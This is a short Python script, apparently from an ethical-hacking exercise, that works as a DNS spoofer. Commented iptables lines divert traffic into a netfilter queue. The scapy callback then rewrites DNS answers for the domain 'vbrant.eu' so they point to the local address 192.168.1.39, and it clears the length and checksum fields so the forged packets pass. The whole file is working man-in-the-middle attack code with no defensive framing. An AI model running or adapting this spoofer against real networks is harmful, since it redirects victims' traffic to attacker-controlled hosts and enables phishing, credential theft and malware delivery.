#!/usr/bin/python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0


import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        print("[+] %s" % qname)
        if "vbrant.eu" in qname:
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.39")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(0, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print
